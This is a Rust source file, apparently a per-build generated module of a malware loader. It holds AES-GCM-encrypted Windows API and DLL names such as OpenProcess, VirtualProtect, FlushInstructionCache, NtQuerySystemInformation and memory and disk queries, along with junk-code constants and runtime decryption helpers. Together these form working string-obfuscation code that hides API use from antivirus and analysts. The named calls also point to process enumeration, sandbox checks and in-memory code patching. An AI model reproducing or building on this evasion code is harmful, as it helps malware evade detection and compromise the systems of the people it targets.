pub static PROCESS32FIRSTW_ENC_CT: &[u8] = &[0xB1, 0x28, 0xC0, 0xC6, 0x42, 0xF6, 0x42, 0x83, 0xDF, 0x30, 0x32, 0xD2, 0xCD, 0x5A, 0xA0, 0xE9, 0xB7, 0x25, 0xFD, 0xC3, 0x94, 0xF5, 0x49, 0x64, 0x82, 0x6A, 0xB3, 0xFD, 0x69, 0xE0, 0x84];
pub static PROCESS32NEXTW_ENC_KEY: [u8; 32] = [0x95, 0x28, 0xAF, 0x5B, 0x5D, 0xBD, 0x3C, 0xF7, 0x02, 0xFE, 0x1A, 0xA0, 0xD7, 0x7B, 0x32, 0x2F, 0x3A, 0x25, 0x6B, 0x2D, 0xAF, 0xFE, 0x34, 0x41, 0x7E, 0xF5, 0xAD, 0x49, 0x8D, 0x16, 0x8D, 0x9A];
pub static PROCESS32NEXTW_ENC_NONCE: [u8; 12] = [0x34, 0x49, 0x0E, 0x00, 0x00, 0x07, 0xB6, 0xD5, 0x8B, 0x43, 0xD0, 0x79];
pub static PROCESS32NEXTW_ENC_CT: &[u8] = &[0x0B, 0xF3, 0x14, 0x0E, 0x56, 0xFB, 0x32, 0x85, 0x8F, 0xA3, 0xA7, 0xF9, 0x70, 0x6D, 0xA2, 0xE8, 0x1F, 0xE5, 0xF7, 0xF8, 0xE8, 0xA7, 0xD4, 0xD6, 0x4C, 0xD5, 0x8A, 0x10, 0x7D, 0x9C];
pub static CLOSEHANDLE_ENC_KEY: [u8; 32] = [0x73, 0xFF, 0xEE, 0xE8, 0xBB, 0x3B, 0xCA, 0x09, 0x5E, 0xA3, 0x7C, 0x58, 0x23, 0xE6, 0x8D, 0xBA, 0x46, 0x93, 0x5C, 0xFC, 0xF1, 0x41, 0x01, 0x59, 0x2F, 0x2D, 0x3C, 0x9F, 0x7B, 0x9A, 0x5F, 0x0A];
pub static CLOSEHANDLE_ENC_NONCE: [u8; 12] = [0xCA, 0x51, 0x52, 0xDB, 0xFA, 0x31, 0x83, 0xC4, 0xFC, 0xCC, 0x19, 0xBC];
pub static CLOSEHANDLE_ENC_CT: &[u8] = &[0x4F, 0x19, 0x2F, 0x62, 0xB7, 0xE5, 0xDA, 0xC7, 0xB7, 0x6E, 0xAD, 0x99, 0x8E, 0x2B, 0x95, 0x88, 0x39, 0x59, 0x4E, 0x18, 0x23, 0xE5, 0xE5, 0x06, 0xC7, 0x0E, 0xD5];
pub static OPENPROCESS_ENC_KEY: [u8; 32] = [0xE9, 0xF9, 0xFC, 0x23, 0xD4, 0xA8, 0xBE, 0x19, 0x4D, 0x18, 0x30, 0x29, 0x39, 0x27, 0x90, 0x9D, 0x40, 0x34, 0xD0, 0x34, 0x08, 0xB5, 0x27, 0xFC, 0xC0, 0x87, 0x19, 0x67, 0x98, 0x4D, 0x72, 0x66];
pub static OPENPROCESS_ENC_NONCE: [u8; 12] = [0x89, 0x82, 0x9B, 0xFF, 0x02, 0xD6, 0x30, 0x03, 0xE7, 0x42, 0x2F, 0xA3];
pub static OPENPROCESS_ENC_CT: &[u8] = &[0x73, 0x4C, 0x2A, 0x3A, 0xCA, 0xA7, 0xEA, 0x12, 0xF3, 0x07, 0x7F, 0xF0, 0x15, 0x0E, 0x64, 0xA6, 0x69, 0x34, 0x1D, 0x7F, 0xC6, 0x75, 0xD2, 0xB0, 0x52, 0x24, 0x87];
pub static QUERYFULLPROCESSIMAGENAMEW_ENC_KEY: [u8; 32] = [0x4D, 0xA5, 0xEA, 0xF3, 0x01, 0xA0, 0x82, 0xA5, 0x77, 0x6F, 0xB5, 0xE2, 0x8A, 0xB1, 0x01, 0x2F, 0x04, 0x47, 0xB8, 0x8F, 0x1A, 0x82, 0xE2, 0x91, 0xD1, 0x3C, 0x1A, 0x94, 0x63, 0x8D, 0x6E, 0xAE];
pub static QUERYFULLPROCESSIMAGENAMEW_ENC_NONCE: [u8; 12] = [0xA4, 0x48, 0x58, 0xAB, 0x89, 0x89, 0x96, 0x61, 0x08, 0xCA, 0x6E, 0x67];
pub static QUERYFULLPROCESSIMAGENAMEW_ENC_CT: &[u8] = &[0x01, 0x55, 0x6E, 0xD7, 0x50, 0x3B, 0x83, 0x7F, 0x63, 0x91, 0x9A, 0xEF, 0xC9, 0xFC, 0x9F, 0x58, 0x8B, 0xF9, 0xA9, 0xB1, 0x7E, 0x82, 0xC0, 0x9C, 0xFB, 0xD2, 0x5A, 0xE2, 0x1C, 0x8F, 0x95, 0xCA, 0xEB, 0xB0, 0xF0, 0xA8, 0x0B, 0xF5, 0xD4, 0x44, 0x76, 0x38];
pub static NTDLL_DLL_ENC_KEY: [u8; 32] = [0xB4, 0x83, 0xAA, 0x15, 0xE2, 0xAE, 0xA6, 0xAF, 0x22, 0xF4, 0xEE, 0x38, 0xFB, 0x0E, 0xB9, 0xFB, 0x04, 0xA7, 0xF3, 0xD6, 0x34, 0xCB, 0x5B, 0x7D, 0x64, 0x48, 0x44, 0x54, 0x2D, 0xF4, 0x37, 0x8C];
pub static NTDLL_DLL_ENC_NONCE: [u8; 12] = [0xD0, 0xE2, 0x6C, 0x41, 0x1A, 0xB2, 0x6F, 0x49, 0xD6, 0x81, 0x6B, 0xBC];
pub static NTDLL_DLL_ENC_CT: &[u8] = &[0x5C, 0xCD, 0x0E, 0x26, 0x13, 0xFE, 0xDE, 0x40, 0x95, 0xDE, 0xE3, 0xFA, 0x92, 0x41, 0x2F, 0xAB, 0x37, 0xB3, 0x0B, 0xCA, 0x4C, 0xEF, 0xCE, 0x56, 0x87];
pub static NTQUERYSYSTEMINFORMATION_ENC_KEY: [u8; 32] = [0x56, 0x93, 0x5B, 0xEA, 0xD1, 0x26, 0x3D, 0xAB, 0xDF, 0xFA, 0x8B, 0x3A, 0xA7, 0xC0, 0xF8, 0x5B, 0x6D, 0xCE, 0x82, 0x62, 0x08, 0x16, 0xB7, 0x34, 0xE5, 0xCA, 0xD4, 0x47, 0x8A, 0x6A, 0x91, 0xCF];
pub static NTQUERYSYSTEMINFORMATION_ENC_NONCE: [u8; 12] = [0x9B, 0x7B, 0x8F, 0x70, 0x04, 0xB8, 0x94, 0x66, 0x5B, 0xED, 0x77, 0xD7];
pub static NTQUERYSYSTEMINFORMATION_ENC_CT: &[u8] = &[0x28, 0x2C, 0x5B, 0xD8, 0x47, 0x06, 0xE5, 0xFD, 0x38, 0xC3, 0xFA, 0xF6, 0x11, 0x5D, 0xA0, 0x50, 0xF8, 0x3B, 0x47, 0xA1, 0xCF, 0x07, 0x9E, 0x4E, 0xCC, 0xBB, 0x77, 0xD2, 0x25, 0x13, 0x40, 0x4A, 0x56, 0x0E, 0xDE, 0x0D, 0x3C, 0x1C, 0x84, 0xAC];
pub static GETDISKFREESPACEEXW_ENC_KEY: [u8; 32] = [0xA9, 0x89, 0xC8, 0xF1, 0x6A, 0x2D, 0xAA, 0x31, 0xE6, 0x54, 0x5B, 0xCB, 0xE0, 0x94, 0xCF, 0x7C, 0x72, 0x44, 0x8D, 0x0A, 0x3B, 0x8B, 0x5A, 0x33, 0xD5, 0xDF, 0xA3, 0x6A, 0xCD, 0xF6, 0x06, 0x70];
pub static GETDISKFREESPACEEXW_ENC_NONCE: [u8; 12] = [0x00, 0x46, 0xE2, 0x6D, 0x02, 0x9C, 0x06, 0xCE, 0xB5, 0x71, 0x50, 0x61];
pub static GETDISKFREESPACEEXW_ENC_CT: &[u8] = &[0xE6, 0x65, 0x29, 0x6E, 0x7D, 0x98, 0xFA, 0xB5, 0xE6, 0x10, 0xDF, 0x7C, 0x4D, 0xEB, 0x22, 0xA7, 0x64, 0x2B, 0x9E, 0x71, 0x53, 0xAB, 0x76, 0x88, 0xBD, 0x96, 0x77, 0x52, 0x5A, 0xA3, 0x67, 0xDB, 0x01, 0x0F, 0xE2];
pub static GETVOLUMEINFORMATIONW_ENC_KEY: [u8; 32] = [0x87, 0x6D, 0x58, 0xCC, 0x2C, 0x9C, 0xBF, 0x3E, 0x0A, 0xB2, 0x6F, 0x00, 0x41, 0x83, 0x6A, 0x51, 0xFD, 0x39, 0x0B, 0xD0, 0x3B, 0x2B, 0xD1, 0x6A, 0xB4, 0x58, 0xB6, 0x90, 0xB5, 0x7F, 0x84, 0xD2];
pub static GETVOLUMEINFORMATIONW_ENC_NONCE: [u8; 12] = [0xFB, 0xAF, 0xFB, 0x0F, 0xFC, 0xCE, 0xA4, 0xA5, 0xAA, 0x7B, 0x8E, 0x1B];
pub static GETVOLUMEINFORMATIONW_ENC_CT: &[u8] = &[0x3A, 0xF4, 0xFB, 0xC8, 0xBE, 0x59, 0x4E, 0xFF, 0x15, 0x56, 0x6F, 0x6D, 0xBE, 0xCA, 0x9F, 0x84, 0x88, 0x7F, 0xD7, 0x6F, 0xC2, 0xB4, 0xE8, 0xA9, 0x95, 0x04, 0xE8, 0x41, 0x9E, 0x78, 0xC3, 0xAC, 0xEE, 0xA5, 0xD0, 0xE9, 0x60];
pub static GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_KEY: [u8; 32] = [0x66, 0xA7, 0xC0, 0x72, 0x75, 0x76, 0x42, 0xDD, 0x45, 0x47, 0x84, 0x23, 0xCD, 0x22, 0x65, 0x10, 0x27, 0xD3, 0xA0, 0x30, 0x44, 0xCD, 0x01, 0xBB, 0x3A, 0x81, 0x4C, 0x06, 0x2A, 0x3D, 0x4E, 0x5D];
pub static GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_NONCE: [u8; 12] = [0xB8, 0x68, 0x8C, 0xE4, 0x25, 0x9F, 0x44, 0xBA, 0x96, 0x0F, 0x88, 0x75];
pub static GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_CT: &[u8] = &[0x08, 0x5D, 0x7D, 0xBF, 0x02, 0xED, 0x5D, 0xDD, 0xA6, 0x5F, 0xC4, 0x88, 0x5F, 0xC1, 0x16, 0xF5, 0x7B, 0xE8, 0xD0, 0x28, 0xE9, 0x77, 0x18, 0xFE, 0x2F, 0xD1, 0x6F, 0x42, 0x75, 0x0C, 0xBD, 0x92, 0x1C, 0xD9, 0xA4, 0x47, 0xB2, 0x2E, 0x26, 0xE0, 0x13, 0xC6, 0x29, 0xB7, 0xE7, 0x0B, 0x09, 0x2E, 0x8D, 0x0B];
pub static VIRTUALPROTECT_ENC_KEY: [u8; 32] = [0xFA, 0x31, 0x9C, 0xEC, 0xA0, 0xD8, 0x9E, 0x6A, 0xEA, 0x83, 0x02, 0xD4, 0xB8, 0x20, 0x03, 0x59, 0x86, 0x8C, 0x55, 0xE2, 0x12, 0xC2, 0x0D, 0xC4, 0x38, 0xC9, 0x71, 0x9C, 0x27, 0xCE, 0x75, 0x07];
pub static VIRTUALPROTECT_ENC_NONCE: [u8; 12] = [0x1B, 0x49, 0xF9, 0xC2, 0x6D, 0x8B, 0xA3, 0xE9, 0x7B, 0x33, 0x31, 0xF1];
pub static VIRTUALPROTECT_ENC_CT: &[u8] = &[0x58, 0x53, 0xAF, 0xED, 0x50, 0x3C, 0x15, 0x07, 0x7D, 0xB6, 0x07, 0x76, 0xDB, 0x5A, 0xFA, 0xB8, 0xC2, 0xAA, 0x49, 0xB7, 0x5D, 0x87, 0x39, 0x23, 0x66, 0xC1, 0x04, 0x97, 0x20, 0x58];
pub static FLUSHINSTRUCTION_ENC_KEY: [u8; 32] = [0xFF, 0x64, 0x8C, 0x66, 0xBE, 0xE8, 0xC6, 0x8B, 0x83, 0x5A, 0x2B, 0xDE, 0xAE, 0x6C, 0xBD, 0x0C, 0x60, 0xCB, 0x50, 0x15, 0xA3, 0x2A, 0xAC, 0x4F, 0x2C, 0x2E, 0xBF, 0x17, 0xB8, 0x72, 0xAF, 0x64];
pub static FLUSHINSTRUCTION_ENC_NONCE: [u8; 12] = [0x72, 0x47, 0xBE, 0x0C, 0x4B, 0xB5, 0x39, 0x20, 0x13, 0x9E, 0x3F, 0x10];
pub static FLUSHINSTRUCTION_ENC_CT: &[u8] = &[0xCD, 0x98, 0x13, 0x53, 0xF2, 0x95, 0xE7, 0x2D, 0xE7, 0x22, 0x56, 0x76, 0x8B, 0x09, 0xD0, 0xA9, 0xFB, 0x26, 0xB8, 0x90, 0x71, 0x60, 0x6E, 0x04, 0x8A, 0x28, 0x4F, 0x9D, 0x7A, 0xCC, 0x12, 0x87, 0xA3, 0x9B, 0x81, 0x7A, 0xF6];
pub static GETCURRENTPROCESS_ENC_KEY: [u8; 32] = [0x37, 0x62, 0x53, 0xA5, 0xCC, 0x7C, 0x6E, 0xCB, 0xBF, 0x63, 0xBA, 0xED, 0x64, 0xB0, 0x73, 0xC9, 0xE2, 0x2C, 0xBA, 0x1E, 0xC9, 0x12, 0xD5, 0x2E, 0x51, 0x2F, 0xF6, 0xAD, 0x69, 0x5C, 0x9D, 0x4C];
pub static GETCURRENTPROCESS_ENC_NONCE: [u8; 12] = [0xE7, 0x19, 0x78, 0x03, 0xDE, 0x9D, 0x9E, 0x1C, 0x5B, 0x5C, 0x37, 0x4B];
pub static GETCURRENTPROCESS_ENC_CT: &[u8] = &[0x05, 0x47, 0xBE, 0xD2, 0x1F, 0xA4, 0x91, 0x83, 0xD0, 0x8C, 0x64, 0xF4, 0x85, 0xF6, 0xA6, 0xE0, 0xAE, 0x56, 0x90, 0xED, 0x44, 0x6F, 0xA4, 0x5E, 0x94, 0x45, 0x57, 0xDF, 0x47, 0x4A, 0x11, 0x0B, 0x3C];

// ===== junk.rs per-build magic constants =====
pub const JUNK_A: u32 = 0x4E55DF9B;
pub const JUNK_B: u32 = 0x198EF751;
pub const JUNK_MAGIC: u32 = 0x63C7;
pub const JUNK_XOR_CONST: u8 = 0xC7;
pub const JUNK_MUL_BIG: u64 = 0x0000000055F848DF;
pub const JUNK_LARGE_XOR: u64 = 0x0000E7F372F0B488;

// ===== AES decrypt functions =====
pub fn aes_decrypt(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> Vec<u8> {
    let cipher = Aes256Gcm::new_from_slice(key).unwrap();
    let n = Nonce::from_slice(nonce);
    cipher.decrypt(n, encoded).unwrap_or_default()
}

pub fn aes_to_cstring(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12]) -> std::ffi::CString {
    let decoded = aes_decrypt(encoded, key, nonce);
    unsafe { std::ffi::CString::from_vec_unchecked(decoded) }
}

pub fn aes_decode_stack(encoded: &[u8], key: &[u8; 32], nonce: &[u8; 12], buf: &mut [u8; 256]) -> usize {
    let decoded = aes_decrypt(encoded, key, nonce);
    let len = decoded.len().min(255);
    buf[..len].copy_from_slice(&decoded[..len]);
    buf[len] = 0;
    len
}
